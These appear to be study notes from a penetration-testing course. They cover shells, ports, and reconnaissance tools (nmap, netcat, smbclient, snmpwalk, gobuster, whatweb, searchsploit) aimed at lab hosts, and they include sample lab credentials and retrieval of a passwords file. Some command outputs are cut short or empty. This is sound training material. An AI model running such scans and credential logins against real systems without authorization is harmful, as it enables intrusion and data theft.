## **Common Terms**

### **What is a Shell?**

`Shell` is a very common term that we will hear again and again during our journey. It has a few meanings. On a Linux system, the shell is a program that takes input from the user via the keyboard and passes these commands to the operating system to perform a specific function. In the early days of computing, the shell was the only interface available for interacting with systems. Since then, many more operating system types and versions have emerged along with the graphic user interface (GUI) to complement command-line interfaces (shell), such as the Linux terminal, Windows command-line (cmd.exe), and Windows PowerShell.

Most Linux systems use a program called [Bash (Bourne Again Shell)](https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html) as a shell program to interact with the operating system. Bash is an enhanced version of [sh](https://man7.org/linux/man-pages/man1/sh.1p.html), the Unix systems' original shell program. Aside from `bash` there are also other shells, including but not limited to [Zsh](https://en.wikipedia.org/wiki/Z_shell), [Tcsh](https://en.wikipedia.org/wiki/Tcsh), [Ksh](https://en.wikipedia.org/wiki/KornShell), [Fish shell](https://en.wikipedia.org/wiki/Fish_(Unix_shell)), etc.

We will often read about or hear others talking about "getting a shell" on a box (system). This means that the target host has been exploited, and we have obtained shell-level access (typically `bash` or `sh`) and can run commands interactively as if we are sitting logged in to the host. A shell may be obtained by exploiting a web application or network/service vulnerability or obtaining credentials and logging into the target host remotely. There are three main types of shell connections:

| **Shell Type** | **Description** |
| --- | --- |
| `Reverse shell` | Initiates a connection back to a "listener" on our attack box. |
| `Bind shell` | "Binds" to a specific port on the target host and waits for a connection from our attack box. |
| `Web shell` | Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a `PHP` script to run a single command. |

Each type of shell has its use case, and the same way there are many ways to obtain a shell, the helper program that we use to get a shell can be written in many languages (`Python`, `Perl`, `Go`, `Bash`, `Java`, `awk`, `PHP`, etc.). These can be small scripts or larger, more complex programs to facilitate a connection from the target host back to our attacking system and obtain "shell" access. Shell access will be discussed in-depth in a later section.

### **What is a Port?**

A [port](https://en.wikipedia.org/wiki/Port_(computer_networking)) can be thought of as a window or door on a house (the house being a remote system), if a window or door is left open or not locked correctly, we can often gain unauthorized access to a home. This is similar in computing. Ports are virtual points where network connections begin and end. They are software-based and managed by the host operating system. Ports are associated with a specific process or service and allow computers to differentiate between different traffic types (SSH traffic flows to a different port than web requests to access a website even though the access requests are sent over the same network connection).

Each port is assigned a number, and many are standardized across all network-connected devices (though a service can be configured to run on a non-standard port). For example, `HTTP` messages (website traffic) typically go to port `80`, while `HTTPS` messages go to port `443` unless configured otherwise. We will encounter web applications running on non-standard ports but typically find them on ports 80 and 443. Port numbers allow us to access specific services or applications running on target devices. At a very high level, ports help computers understand how to handle the various types of data they receive.

There are two categories of ports, [Transmission Control Protocol (TCP)](https://en.wikipedia.org/wiki/Transmission_Control_Protocol), and [User Datagram Protocol (UDP)](https://en.wikipedia.org/wiki/User_Datagram_Protocol).

`TCP` is connection-oriented, meaning that a connection between a client and a server must be established before data can be sent. The server must be in a listening state awaiting connection requests from clients.

`UDP` utilizes a connectionless communication model. There is no "handshake" and therefore introduces a certain amount of unreliability since there is no guarantee of data delivery. `UDP` is useful when error correction/checking is either not needed or is handled by the application itself. `UDP` is suitable for applications that run time-sensitive tasks since dropping packets is faster than waiting for delayed packets due to retransmission, as is the case with `TCP` and can significantly affect a real-time system. There are `65,535` `TCP` ports and `65,535` different `UDP` ports, each denoted by a number. Some of the most well-known `TCP` and `UDP` ports are listed below:

| **Port(s)** | **Protocol** |
| --- | --- |
| `20`/`21` (TCP) | `FTP` |
| `22` (TCP) | `SSH` |
| `23` (TCP) | `Telnet` |
| `25` (TCP) | `SMTP` |
| `80` (TCP) | `HTTP` |
| `161` (TCP/UDP) | `SNMP` |
| `389` (TCP/UDP) | `LDAP` |
| `443` (TCP) | `SSL`/`TLS` (`HTTPS`) |
| `445` (TCP) | `SMB` |
| `3389` (TCP) | `RDP` |

As information security professionals, we must be able to quickly recall large amounts of information on a wide variety of topics. It is essential for us, especially as pentesters, to have a firm grasp of many `TCP` and `UDP` ports and be able to recognize them from just their number quickly (i.e., know that port `21` is `FTP`, port `80` is `HTTP`, port `88` is `Kerberos`) without having to look it up. This will come with practice and repetition and eventually become second nature as we attack more boxes, labs, and real-world networks and help us work more efficiently and better prioritize our enumeration efforts and attacks.

Guides such as [this](https://www.stationx.net/common-ports-cheat-sheet/) and [this](https://web.archive.org/web/20240315102711/https://packetlife.net/media/library/23/common-ports.pdf) are great resources for learning standard and less common TCP and UDP ports. Challenge yourself to memorize as many of these as possible and do some research about each of the protocols listed in the table above. This is a great [reference](https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/) on the top 1,000 `TCP` and `UDP` ports from `nmap` along with the top 100 services scanned by `nmap`.

### **What is a Web Server**

A web server is an application that runs on the back-end server, which handles all of the `HTTP` traffic from the client-side browser, routes it to the requests destination pages, and finally responds to the client-side browser. Web servers usually run on TCP ports `80` or `443`, and are responsible for connecting end-users to various parts of the web application, in addition to handling their various responses:

![https://academy.hackthebox.com/storage/modules/77/htb_main_2.jpg](https://academy.hackthebox.com/storage/modules/77/htb_main_2.jpg)

As web applications tend to be open for public interaction and facing the internet, they may lead to the back-end server being compromised if they suffer from any vulnerabilities. Web applications can provide a vast attack surface, making them a high-value target for attackers and pentesters.

Many types of vulnerabilities can affect web applications. We will often hear about/see references to the [OWASP Top 10](https://owasp.org/www-project-top-ten/). This is a standardized list of the top 10 web application vulnerabilities maintained by the Open Web Application Security Project (OWASP). This list is considered the top 10 most dangerous vulnerabilities and is not an exhaustive list of all possible web application vulnerabilities. Web application security assessment methodologies are often based around the OWASP top 10 as a starting point for the top categories of flaws that an assessor should be checking for. The current OWASP Top 10 list is:

| **Number** | **Category** | **Description** |
| --- | --- | --- |
| 1. | [Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/) | Restrictions are not appropriately implemented to prevent users from accessing other users accounts, viewing sensitive data, accessing unauthorized functionality, modifying data, etc. |
| 2. | [Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/) | Failures related to cryptography which often leads to sensitive data exposure or system compromise. |
| 3. | [Injection](https://owasp.org/Top10/A03_2021-Injection/) | User-supplied data is not validated, filtered, or sanitized by the application. Some examples of injections are SQL injection, command injection, LDAP injection, etc. |
| 4. | [Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/) | These issues happen when the application is not designed with security in mind. |
| 5. | [Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) | Missing appropriate security hardening across any part of the application stack, insecure default configurations, open cloud storage, verbose error messages which disclose too much information. |
| 6. | [Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/) | Using components (both client-side and server-side) that are vulnerable, unsupported, or out of date. |
| 7. | [Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/) | Authentication-related attacks that target user's identity, authentication, and session management. |
| 8. | [Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/) | Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. An example of this is where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and content delivery networks (CDNs). |
| 9. | [Security Logging and Monitoring Failures](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/) | This category is to help detect, escalate, and respond to active breaches. Without logging and monitoring, breaches cannot be detected.. |
| 10. | [Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/) | SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL). |

It is essential to become familiar with each of these categories and the various vulnerabilities that fit each. Web application vulnerabilities will be covered in-depth in later modules. To learn more about web applications, check out the [Introduction to Web Applications](https://academy.hackthebox.com/module/details/75) module.

## **Basic Tools**

### **Using SSH**

[Secure Shell (SSH)](https://en.wikipedia.org/wiki/SSH_(Secure_Shell)) is a network protocol that runs on port `22` by default and provides users such as system administrators a secure way to access a computer remotely. SSH can be configured with password authentication or passwordless using [public-key authentication](https://serverpilot.io/docs/how-to-use-ssh-public-key-authentication/) using an SSH public/private key pair. SSH can be used to remotely access systems on the same network, over the internet, facilitate connections to resources in other networks using port forwarding/proxying, and upload/download files to and from remote systems.

SSH uses a client-server model, connecting a user running an SSH client application such as `OpenSSH` to an SSH server. While attacking a box or during a real-world assessment, we often obtain cleartext credentials or an SSH private key that can be leveraged to connect directly to a system via SSH. An SSH connection is typically much more stable than a reverse shell connection and can often be used as a "jump host" to enumerate and attack other hosts in the network, transfer tools, set up persistence, etc. If we obtain a set of credentials, we can use SSH to login remotely to the server by using the username `@` the remote server IP, as follows:


```
th1nyunb0y@htb[/htb]$ ssh Bob@10.10.10.10Bob@remotehost's password: *********

Bob@remotehost#

```

It is also possible to read local private keys on a compromised system or add our public key to gain SSH access to a specific user, as we'll discuss in a later section. As we can see, SSH is an excellent tool for securely connecting to a remote machine. It also provides a way for mapping local ports on the remote machine to our localhost, which can become handy at times.

### **Using Netcat**

[Netcat](https://linux.die.net/man/1/nc), `ncat`, or `nc`, is an excellent network utility for interacting with TCP/UDP ports. It can be used for many things during a pentest. Its primary usage is for connecting to shells, which we'll discuss later in this module. In addition to that, `netcat` can be used to connect to any listening port and interact with the service running on that port. For example, `SSH` is programmed to handle connections over port 22 to send all data and keys. We can connect to TCP port 22 with `netcat`:


```
th1nyunb0y@htb[/htb]$ netcat 10.10.10.10 22SSH-2.0-OpenSSH_8.4p1 Debian-3

```

As we can see, port 22 sent us its banner, stating that `SSH` is running on it. This technique is called `Banner Grabbing`, and can help identify what service is running on a particular port. `Netcat` comes pre-installed in most Linux distributions. We can also download a copy for Windows machines from this [link](https://nmap.org/download.html). There's another Windows alternative to `netcat` coded in PowerShell called [PowerCat](https://github.com/besimorhino/powercat). `Netcat` can also be used to transfer files between machines, as we'll discuss later.

Another similar network utility is [socat](https://linux.die.net/man/1/socat), which has a few features that `netcat` does not support, like forwarding ports and connecting to serial devices. `Socat` can also be used to [upgrade a shell to a fully interactive TTY](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat). We will see a few examples of this in a later section. `Socat` is a very handy utility that should be a part of every penetration tester's toolkit. A [standalone binary](https://github.com/andrew-d/static-binaries) of `Socat` can be transferred to a system after obtaining remote code execution to get a more stable reverse shell connection.

### **Using Tmux**

Terminal multiplexers, like `tmux` or `Screen`, are great utilities for expanding a standard Linux terminal's features, like having multiple windows within one terminal and jumping between them. Let's see some examples of using `tmux`, which is the more common of the two. If `tmux` is not present on our Linux system, we can install it with the following command:


```
th1nyunb0y@htb[/htb]$ sudo apt install tmux -y
```

Once we have `tmux`, we can start it by entering `tmux` as our command:

![https://academy.hackthebox.com/storage/modules/77/getting_started_tmux_1.jpg](https://academy.hackthebox.com/storage/modules/77/getting_started_tmux_1.jpg)

The default key to input `tmux` commands prefix is `[CTRL + B]`. In order to open a new window in `tmux`, we can hit the prefix 'i.e. `[CTRL + B]`' and then hit `C`:
![https://academy.hackthebox.com/storage/modules/77/getting_started_tmux_2.jpg](https://academy.hackthebox.com/storage/modules/77/getting_started_tmux_2.jpg)

We see the numbered windows at the bottom. We can switch to each window by hitting the prefix and then inputting the window number, like `0` or `1`. We can also split a window vertically into panes by hitting the prefix and then `[SHIFT + %]`:

![https://academy.hackthebox.com/storage/modules/77/getting_started_tmux_3.jpg](https://academy.hackthebox.com/storage/modules/77/getting_started_tmux_3.jpg)

We can also split into horizontal panes by hitting the prefix and then `[SHIFT + "]`:

![https://academy.hackthebox.com/storage/modules/77/getting_started_tmux_4.jpg](https://academy.hackthebox.com/storage/modules/77/getting_started_tmux_4.jpg)

We can switch between panes by hitting the prefix and then the `left` or `right` arrows for horizontal switching or the `up` or `down` arrows for vertical switching. The commands above cover some basic `tmux` usage. It is a powerful tool and can be used for many things, including logging, which is very important during any technical engagement. This [cheatsheet](https://tmuxcheatsheet.com/) is a very handy reference. Also, this [Introduction to tmux](https://www.youtube.com/watch?v=Lqehvpe_djs) video by `ippsec` is worth your time.

### **Using Vim**

[Vim](https://linuxcommand.org/lc3_man_pages/vim1.html) is a great text editor that can be used for writing code or editing text files on Linux systems. One of the great benefits of using `Vim` is that it relies entirely on the keyboard, so you do not have to use the mouse, which (once we get the hold of it) will significantly increase your productivity and efficiency in writing/editing code. We usually find `Vim` or `Vi` installed on compromised Linux systems, so learning how to use it allows us to edit files even on remote systems. `Vim` also has many other features, like extensions and plugins, which can significantly extend its usage and make for a great code editor. Let's see some of the basics of `Vim`. To open a file with `Vim`, we can add the file name after it:


```
th1nyunb0y@htb[/htb]$ vim /etc/hosts
```

![https://academy.hackthebox.com/storage/modules/77/getting_started_vim_1.jpg](https://academy.hackthebox.com/storage/modules/77/getting_started_vim_1.jpg)

If we want to create a new file, input the new file name, and `Vim` will open a new window with that file. Once we open a file, we are in read-only `normal mode`, which allows us to navigate and read the file. To edit the file, we hit `i` to enter `insert mode`, shown by the "`-- INSERT --`" at the bottom of `Vim`. Afterward, we can move the text cursor and edit the file:

![https://academy.hackthebox.com/storage/modules/77/getting_started_vim_2.jpg](https://academy.hackthebox.com/storage/modules/77/getting_started_vim_2.jpg)

Once we are finished editing a file, we can hit the escape key `esc` to get out of `insert mode`, back into `normal mode`. When we are in `normal mode`, we can use the following keys to perform some useful shortcuts:

| **Command** | **Description** |
| --- | --- |
| `x` | Cut character |
| `dw` | Cut word |
| `dd` | Cut full line |
| `yw` | Copy word |
| `yy` | Copy full line |
| `p` | Paste |

Tip: We can multiply any command to run multiple times by adding a number before it. For example, '4yw' would copy 4 words instead of one, and so on.

If we want to save a file or quit `Vim`, we have to press`:` to go into `command mode`. Once we do, we will see any commands we type at the bottom of the vim window:

![https://academy.hackthebox.com/storage/modules/77/getting_started_vim_3.jpg](https://academy.hackthebox.com/storage/modules/77/getting_started_vim_3.jpg)

There are many commands available to us. The following are some of them:

| **Command** | **Description** |
| --- | --- |
| `:1` | Go to line number 1. |
| `:w` | Write the file, save |
| `:q` | Quit |
| `:q!` | Quit without saving |
| `:wq` | Write and quit |

`Vim` is a very powerful tool and has many other commands and features. This [cheatsheet](https://vimsheet.com/) is an excellent resource for further unlocking the power of `Vim`.

## **Service Scanning**

### **Nmap**

Let us start with the most basic scan. Suppose that we want to perform a basic scan against a target residing at 10.129.42.253. To do this we should type `nmap 10.129.42.253` and hit return. We see that the `Nmap` scan was completed very quickly. This is because if we don't specify any additional options, Nmap will only scan the 1,000 most common ports by default. The scan output reveals that ports 21, 22, 80, 139, and 445 are available.

Service Scanning

```
th1nyunb0y@htb[/htb]$ nmap 10.129.42.253Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:07 EST

22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 2.19 seconds

```

Under the `PORT` heading, it also tells us that these are TCP ports. By default, `Nmap` will conduct a TCP scan unless specifically requested to perform a UDP scan.

The `STATE` heading confirms that these ports are open. Sometimes we will see other ports listed that have a different state, such as `filtered`. This can happen if a firewall is only allowing access to the ports from specific addresses.

The `SERVICE` heading tells us the service's name is typically mapped to the specific port number. However, the default scan will not tell us what is listening on that port. Until we instruct `Nmap` to interact with the service and attempt to tease out identifying information, it could be another service altogether.

As we gain familiarity, we will notice that several ports are commonly associated with Windows or Linux. For example, port 3389 is the default port for Remote Desktop Services and is an excellent indication that the target is a Windows machine. In our current scenario, port 22 (SSH) being available indicates that the target is running Linux/Unix, but this service can also be configured on Windows. Let us run a more advanced `Nmap` scan and gather more information about the target device.

We can use the `-sC` parameter to specify that `Nmap` scripts should be used to try and obtain more detailed information. The `-sV` parameter instructs `Nmap` to perform a version scan. In this scan, Nmap will fingerprint services on the target system and identify the service protocol, application name, and version. The version scan is underpinned by a comprehensive database of over 1,000 service signatures. Finally, `-p-` tells Nmap that we want to scan all 65,535 TCP ports.

```
th1nyunb0y@htb[/htb]$ nmap -sV -sC -p- 10.129.42.253Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:18 EST

```

This returns a lot more information. We see that it took a lot longer to scan 65,535 ports than 1,000 ports. The `-sC` and `-sV` options also increase the duration of a scan, as instead of performing a simple TCP handshake, they perform a lot more checks. We notice that this time there is a VERSION heading, which reports the service version and the operating system if this is possible to identify.

So far, we know that the operating system is Ubuntu Linux. Application versions can also help reveal the target OS version. Take OpenSSH, for example. We see the reported version is `OpenSSH 8.2p1 Ubuntu 4ubuntu0.1`. From inspection of other Ubuntu SSH package [changelogs](https://launchpad.net/ubuntu/yakkety/+source/openssh/+changelog), we see the release version takes the format `1:7.3p1-1ubuntu0.1`. Updating our version to fit this format, we get `1:8.2p1-4ubuntu0.1`. A quick search for this version online reveals that it is included in Ubuntu Linux Focal Fossa 20.04.

![https://academy.hackthebox.com/storage/modules/77/google1.png](https://academy.hackthebox.com/storage/modules/77/google1.png)

Another quick search reveals that the release date of this OS is April 23rd, 2020.

However, it is worth noting that this cross-referencing technique is not entirely reliable, as it is possible to install more recent application packages on an older OS version. The script scan `-sC` flag causes `Nmap` to report the server headers `http-server-header` page and the page title `http-title` for any web page hosted on the webserver. The web page title `PHP 7.4.3 - phpinfo()` indicates that this is a PHPInfo file, which is often manually created to confirm that PHP has been successfully installed. The title (and PHPInfo page) also reveals the PHP version, which is worth noting if it is vulnerable.

**Nmap Scripts**

Specifying `-sC` will run many useful default scripts against a target, but there are cases when running a specific script is required. For example, in an assessment scope, we may be asked to audit a large Citrix installation. We could use [this](https://raw.githubusercontent.com/cyberstruggle/DeltaGroup/master/CVE-2019-19781/CVE-2019-19781.nse) `Nmap` script to audit for the severe Citrix NetScaler vulnerability ([CVE-2019–19781](https://blog.rapid7.com/2020/01/17/active-exploitation-of-citrix-netscaler-cve-2019-19781-what-you-need-to-know/)), while `Nmap` also has other scripts to audit a Citrix installation.

Service Scanning

```
th1nyunb0y@htb[/htb]$ locate scripts/citrix/usr/share/nmap/scripts/citrix-brute-xml.nse
/usr/share/nmap/scripts/citrix-enum-apps-xml.nse
/usr/share/nmap/scripts/citrix-enum-apps.nse
/usr/share/nmap/scripts/citrix-enum-servers-xml.nse
/usr/share/nmap/scripts/citrix-enum-servers.nse

```

The syntax for running an Nmap script is `nmap --script <script name> -p<port> <host>`.

`Nmap` scripts are a great way to enhance our scans' functionality, and inspection of the available options will pay dividends. Check out the [Network Enumeration with Nmap](https://academy.hackthebox.com/module/details/19) module for a more detailed study of the `Nmap` tool.

### **Attacking Network Services**

**Banner Grabbing**

As previously discussed, banner grabbing is a useful technique to fingerprint a service quickly. Often a service will look to identify itself by displaying a banner once a connection is initiated. Nmap will attempt to grab the banners if the syntax `nmap -sV --script=banner <target>` is specified. We can also attempt this manually using `Netcat`. Let us take another example, using the `nc` version of `Netcat`:

```
th1nyunb0y@htb[/htb]$ nc -nv 10.129.42.253 21(UNKNOWN) [10.129.42.253] 21 (ftp) open
220 (vsFTPd 3.0.3)

```

This reveals that the version of `vsFTPd` on the server is `3.0.3`. We can also automate this process using `Nmap's` powerful scripting engine: `nmap -sV --script=banner -p21 10.10.10.0/24`.

**FTP**

It is worth gaining familiarity with FTP, as it is a standard protocol, and this service can often contain interesting data. A `Nmap` scan of the default port for FTP (21) reveals the vsftpd 3.0.3 installation that we identified previously. Further, it also reports that anonymous authentication is enabled and that a `pub` directory is available.

```
th1nyunb0y@htb[/htb]$ nmap -sC -sV -p21 10.129.42.253Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-20 00:54 GMT

```

Let us connect to the service using the `ftp` command-line utility.

```
th1nyunb0y@htb[/htb]$ ftp -p 10.129.42.253Connected to 10.129.42.253.

```

In the above shell, we see that FTP supports common commands such as `cd` and `ls` and allows us to download files using the `get` command. Inspection of the downloaded `login.txt` reveals credentials that we could use to further our access to the system.

```
th1nyunb0y@htb[/htb]$ cat login.txt admin:ftp@dmin123

```

**SMB**

SMB (Server Message Block) is a prevalent protocol on Windows machines that provides many vectors for vertical and lateral movement. Sensitive data, including credentials, can be in network file shares, and some SMB versions may be vulnerable to RCE exploits such as [EternalBlue](https://www.avast.com/c-eternalblue). It is crucial to enumerate this sizeable potential attack surface carefully. `Nmap` has many scripts for enumerating SMB, such as [smb-os-discovery.nse](https://nmap.org/nsedoc/scripts/smb-os-discovery.html), which will interact with the SMB service to extract the reported operating system version.

```
th1nyunb0y@htb[/htb]$ nmap --script smb-os-discovery.nse -p445 10.10.10.40Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-27 00:59 GMT

|_  System time: 2020-12-27T00:59:46+00:00

Nmap done: 1 IP address (1 host up) scanned in 2.71 seconds

```

In this case, the host runs a legacy Windows 7 OS, and we could conduct further enumeration to confirm if it is vulnerable to EternalBlue. The Metasploit Framework has several [modules](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/) for EternalBlue that can be used to validate the vulnerability and exploit it, as we will see in a coming section. We can run a scan against our target for this module section to gather information from the SMB service. We can ascertain that the host runs a Linux kernel, Samba version 4.6.2, and the hostname is GS-SVCSCAN.

```
th1nyunb0y@htb[/htb]$ nmap -A -p445 10.129.42.253Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:29 EST

**Shares**

SMB allows users and administrators to share folders and make them accessible remotely by other users. Often these shares have files in them that contain sensitive information such as passwords. A tool that can enumerate and interact with SMB shares is [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html). The `-L` flag specifies that we want to retrieve a list of available shares on the remote host, while `-N` suppresses the password prompt.

```
th1nyunb0y@htb[/htb]$ smbclient -N -L \\\\10.129.42.253	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers	users           Disk
	IPC$            IPC       IPC Service (gs-svcscan server (Samba, Ubuntu))SMB1 disabled -- no workgroup available

```

This reveals the non-default share `users`. Let us attempt to connect as the guest user.

```
th1nyunb0y@htb[/htb]$ smbclient \\\\10.129.42.253\\usersEnter WORKGROUP\users's password:
Try "help" to get a list of possible commands.

smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*

smb: \> exit

```

The `ls` command resulted in an access denied message, indicating that guest access is not permitted. Let us try again using credentials for the user bob (`bob:Welcome1`).

```
th1nyunb0y@htb[/htb]$ smbclient -U bob \\\\10.129.42.253\\usersEnter WORKGROUP\bob's password:
Try "help" to get a list of possible commands.

smb: \bob\> get passwords.txt
getting file \bob\passwords.txt of size 156 as passwords.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)

```

We successfully gained access to the `users` share using credentials and gained access to the interesting file `passwords.txt`, which can be downloaded with the `get` command.

**SNMP**

SNMP Community strings provide information and statistics about a router or device, helping us gain access to it. The manufacturer default community strings of `public` and `private` are often unchanged. In SNMP versions 1 and 2c, access is controlled using a plaintext community string, and if we know the name, we can gain access to it. Encryption and authentication were only added in SNMP version 3. Much information can be gained from SNMP. Examination of process parameters might reveal credentials passed on the command line, which might be possible to reuse for other externally accessible services given the prevalence of password reuse in enterprise environments. Routing information, services bound to additional interfaces, and the version of installed software can also be revealed.

```
th1nyunb0y@htb[/htb]$ snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0iso.3.6.1.2.1.1.5.0 = STRING: "gs-svcscan"

```

```
th1nyunb0y@htb[/htb]$ snmpwalk -v 2c -c private  10.129.42.253 Timeout: No Response from 10.129.42.253

```

A tool such as [onesixtyone](https://github.com/trailofbits/onesixtyone) can be used to brute force the community string names using a dictionary file of common community strings such as the `dict.txt` file included in the GitHub repo for the tool.

```
th1nyunb0y@htb[/htb]$ onesixtyone -c dict.txt 10.129.42.254Scanning 1 hosts, 51 communities

```

## **Web Enumeration**

### **Gobuster**

After discovering a web application, it is always worth checking to see if we can uncover any hidden files or directories on the webserver that are not intended for public access. We can use a tool such as [ffuf](https://github.com/ffuf/ffuf) or [GoBuster](https://github.com/OJ/gobuster) to perform this directory enumeration. Sometimes we will find hidden functionality or pages/directories exposing sensitive data that can be leveraged to access the web application or even remote code execution on the web server itself.

**Directory/File Enumeration**

GoBuster is a versatile tool that allows for performing DNS, vhost, and directory brute-forcing. The tool has additional functionality, such as enumeration of public AWS S3 buckets. For this module's purposes, we are interested in the directory (and file) brute-forcing modes specified with the switch `dir`. Let us run a simple scan using the `dirb` `common.txt` wordlist.


```

```

An HTTP status code of `200` reveals that the resource's request was successful, while a 403 HTTP status code indicates that we are forbidden to access the resource. A 301 status code indicates that we are being redirected, which is not a failure case. It is worth familiarizing ourselves with the various HTTP status codes, which can be found [here](https://en.wikipedia.org/wiki/List_of_HTTP_status_codes). The `Web Requests` Academy Module also covers HTTP status codes further in-depth.

The scan was completed successfully, and it identifies a WordPress installation at `/wordpress`. WordPress is the most commonly used CMS (Content Management System) and has an enormous potential attack surface. In this case, visiting `http://10.10.10.121/wordpress` in a browser reveals that WordPress is still in setup mode, which will allow us to gain remote code execution (RCE) on the server.

![https://academy.hackthebox.com/storage/modules/77/wordpress.png](https://academy.hackthebox.com/storage/modules/77/wordpress.png)

**DNS Subdomain Enumeration**

There also may be essential resources hosted on subdomains, such as admin panels or applications with additional functionality that could be exploited. We can use `GoBuster` to enumerate available subdomains of a given domain using the `dns` flag to specify DNS mode. First, let us clone the SecLists GitHub [repo](https://github.com/danielmiessler/SecLists), which contains many useful lists for fuzzing and exploitation:

**Install SecLists**

```
th1nyunb0y@htb[/htb]$ git clone https://github.com/danielmiessler/SecLists
```

```
th1nyunb0y@htb[/htb]$ sudo apt install seclists -y
```

Next, add a DNS Server such as 1.1.1.1 to the `/etc/resolv.conf` file. We will target the domain `inlanefreight.com`, the website for a fictional freight and logistics company.

```
th1nyunb0y@htb[/htb]$ gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt===============================================================

```

This scan reveals several interesting subdomains that we could examine further. The [Attacking Web Applications with Ffuf](https://academy.hackthebox.com/module/details/54) module goes into more details about web enumeration and fuzzing.

### **Web Enumeration Tips**

Let us walk through a few additional web enumeration tips that will help complete machines on HTB and in the real world.

**Banner Grabbing / Web Server Headers**

In the last section, we discussed banner grabbing for general purposes. Web server headers provide a good picture of what is hosted on a web server. They can reveal the specific application framework in use, the authentication options, and whether the server is missing essential security options or has been misconfigured. We can use `cURL` to retrieve server header information from the command line. `cURL` is another essential addition to our penetration testing toolkit, and familiarity with its many options is encouraged.

```
th1nyunb0y@htb[/htb]$ curl -IL https://www.inlanefreight.comHTTP/1.1 200 OK
Date: Fri, 18 Dec 2020 22:24:05 GMT
Server: Apache/2.4.29 (Ubuntu)
Link: <https://www.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/"
Link: <https://www.inlanefreight.com/>; rel=shortlink
Content-Type: text/html; charset=UTF-8

```

Another handy tool is [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness), which can be used to take screenshots of target web applications, fingerprint them, and identify possible default credentials.

### **Whatweb**

We can extract the version of web servers, supporting frameworks, and applications using the command-line tool `whatweb`. This information can help us pinpoint the technologies in use and begin to search for potential vulnerabilities.

```
th1nyunb0y@htb[/htb]$ whatweb 10.10.10.121http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]

```

`Whatweb` is a handy tool and contains much functionality to automate web application enumeration across a network.

```
th1nyunb0y@htb[/htb]$ whatweb --no-errors 10.10.10.0/24http://10.10.10.11 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.11], PoweredBy[Red,nginx], Title[Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux], nginx[1.14.1]

```

**Certificates**

SSL/TLS certificates are another potentially valuable source of information if HTTPS is in use. Browsing to `https://10.10.10.121/` and viewing the certificate reveals the details below, including the email address and company name. These could potentially be used to conduct a phishing attack if this is within the scope of an assessment.

![https://academy.hackthebox.com/storage/modules/77/cert.png](https://academy.hackthebox.com/storage/modules/77/cert.png)

**Robots.txt**

It is common for websites to contain a `robots.txt` file, whose purpose is to instruct search engine web crawlers such as Googlebot which resources can and cannot be accessed for indexing. The `robots.txt` file can provide valuable information such as the location of private files and admin pages. In this case, we see that the `robots.txt` file contains two disallowed entries.

![https://academy.hackthebox.com/storage/modules/77/robots.png](https://academy.hackthebox.com/storage/modules/77/robots.png)

Navigating to `http://10.10.10.121/private` in a browser reveals a HTB admin login page.

![https://academy.hackthebox.com/storage/modules/77/academy.png](https://academy.hackthebox.com/storage/modules/77/academy.png)

**Source Code**

It is also worth checking the source code for any web pages we come across. We can hit `[CTRL + U]` to bring up the source code window in a browser. This example reveals a developer comment containing credentials for a test account, which could be used to log in to the website.

![https://academy.hackthebox.com/storage/modules/77/source.png](https://academy.hackthebox.com/storage/modules/77/source.png)

## **Public Exploits**

### **Finding Public Exploits**

Many tools can help us search for public exploits for the various applications and services we may encounter during the enumeration phase. One way is to Google for the application name with `exploit` to see if we get any results:

![https://academy.hackthebox.com/storage/modules/77/google_smb.jpg](https://academy.hackthebox.com/storage/modules/77/google_smb.jpg)

A well-known tool for this purpose is `searchsploit`, which we can use to search for public vulnerabilities/exploits for any application. We can install it with the following command:

Public Exploits

```
th1nyunb0y@htb[/htb]$ sudo apt install exploitdb -y
```

Then, we can use `searchsploit` to search for a specific application by its name, as follows:

We can also utilize online exploit databases to search for vulnerabilities, like [Exploit DB](https://www.exploit-db.com/), [Rapid7 DB](https://www.rapid7.com/db/), or [Vulnerability Lab](https://www.vulnerability-lab.com/). The [Intro to Web Applications](https://academy.hackthebox.com/module/details/75) module discusses public vulnerabilities for web applications.

